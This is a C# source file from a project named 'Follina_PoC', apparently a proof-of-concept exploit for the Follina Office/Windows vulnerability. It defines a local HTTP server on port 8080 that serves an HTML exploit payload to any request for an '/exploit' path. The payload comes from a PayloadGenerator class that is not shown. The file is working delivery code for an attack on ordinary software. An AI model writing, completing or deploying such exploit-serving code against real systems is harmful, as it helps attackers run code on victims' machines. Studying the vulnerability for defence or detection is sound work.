using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Follina_PoC
{
    internal class WebServer
    {
        private HttpListener? Listener { get; set; }

        private bool Running { get; set; }

        private async Task HandleIncomingConnections()
        {
            if (Listener == null)
                Listener = new();

            var context = await Listener.GetContextAsync();

            if (context.Request.Url?.AbsolutePath?.Contains("/exploit") == true)
            {
                var response = context.Response;

                response.StatusCode = (int)HttpStatusCode.OK;
                response.ContentType = "text/html";

                var payload = PayloadGenerator.CreateHTMLPayload();

                response.ContentEncoding = Encoding.UTF8;
                response.ContentLength64 = payload.LongLength;
                await response.OutputStream.WriteAsync(payload);
                response.Close();
            }
        }

        public async void Start()
        {
            Listener = new();
            Listener.Prefixes.Add("http://[::1]:8080/");
            Listener.Start();

            Running = true;

            while (Running)
            {
                await HandleIncomingConnections();
            }

            Listener.Close();
        }
    }
}